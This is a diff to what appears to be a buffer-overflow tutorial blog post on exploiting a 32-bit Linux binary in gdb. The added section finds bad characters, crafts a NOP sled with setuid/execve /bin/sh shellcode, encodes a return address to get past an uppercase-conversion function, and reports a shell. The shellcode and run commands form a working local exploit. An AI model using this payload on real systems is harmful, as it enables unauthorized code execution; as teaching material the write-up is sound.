@@ -408,7 +408,7 @@ So, let's summaries that, there is a path we can use to achieve our goal by mani
 
 **2.** Finding the offset - trying to find the max size for the crash point, meaning how much more data we can insert to the crash point in such way that the execution not change the stack and EIP location.
 
-**3.** Overwrite the RIP - running `msf-pattern_create -l <number>` and find on the crash point, where the `EIP` location, we can use the `msf-pattern_offset -q <eip value>` command.
+**3.** Overwrite the EIP - running `msf-pattern_create -l <number>` and find on the crash point, where the `EIP` location, we can use the `msf-pattern_offset -q <eip value>` command.
 
 **4.** Finding the bad chars - after finding the size that can be use for the crash, find what chars are the bed chars, we can use the following command `badchars -f python`, then after crash, if the location of the `EIP` was change it's mean that there is some char that have special command, so we need to go the register and find the badchars location and remove the chars needed.
 
@@ -462,3 +462,54 @@ So now we need to find the location of the EIP, in my guess it's the last 4 char
 
 ![bo-018.png](/assets/images/bo-018.png)
 **Figure 18** Overwrite the EIP with `B`.
+
+So now it's time to check the bad chars if we have such on our case, we can run the command `badchars` on our kali, or just run the following:
+```
+badchars -f js | sed 's/ //g' | sed 's/"//g' | sed 's/+//g' | tr -d "\n"
+```
+
+The output should be the following:
+
+![bo-019.png](/assets/images/bo-019.png)
+**Figure 19** Badchars string.
+
+We can use that output on our debugging, but now it's time to make break point to main and then run that badchars check, so run `break main` will give us the first break point on our gdb.
+
+![bo-020.png](/assets/images/bo-020.png)
+**Figure 20** Make break point to main and check badchars.
+
+So now we need to look on our stack and search for the location of bad chars, since I have users multiple `A` we need to find `\x41` first and then I should look for the order of the chars for bad chars.
+
+On our case the bad chars are `\x01`, `\x09`, `\x20`, the 01 char was not dispay on the screen and the others was change to `\x00` which is not in place, that mean that these chars are used for another direction on the binary file, so we need to avoid using them on our executable code.
+
+![bo-021.png](/assets/images/bo-021.png)
+**Figure 21** Checking the badchars location.
+
+The chars on our shell code not contain these bad chars so we still use it:
+```
+\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80
+```
+
+So now we need to make SLAD to our shell code, since we know that the segmentation fault occur on 500 chars long we can calculated what we need:
+```
+run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x62\x62\x62\x62'")
+```
+
+Please note, the `\x62` is `b`, since I want to see EIP overwrite with BBBB and since we have convertToUppercase function, I must to use lowercase `b` for that case.
+
+![bo-022.png](/assets/images/bo-022.png)
+**Figure 22** Running the code with overwrite the EIP.
+
+Now, think about it, if we must write `\x62` for get `\x42` as the output for overwrite the EIP, it's mean that we must insert EIP address that contain value of uppercase for the address that point to our SLAD, so let's check the ESP what is that address.
+
+![bo-023.png](/assets/images/bo-023.png)
+**Figure 23** Searching for the correct address.
+
+After we found the address that point out to out NULL chain bytes, we need to convert that to "uppercase" so we can use it on the EIP, so in my case the address is `0xffffcfe0` which mean that the EIP should be overwrite with `\xe0\xcf\xff\xff`, so by convert to we should get `\x00\xef\x1f\x1f`, but since we can't use `\x00` we need to use some other char, so give it more for byte lead as to the following `\x04\xef\x1f\x1f` which should be change by the uppercase function to `0xffffcfe4`.
+```
+run $(python2 -c "print '\x90'*468+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x04\xef\x1f\x1f'")
+```
+Then BOIA!!!! we have a shell!
+
+![bo-024.png](/assets/images/bo-024.png)
+**Figure 24** Shell from GDB.
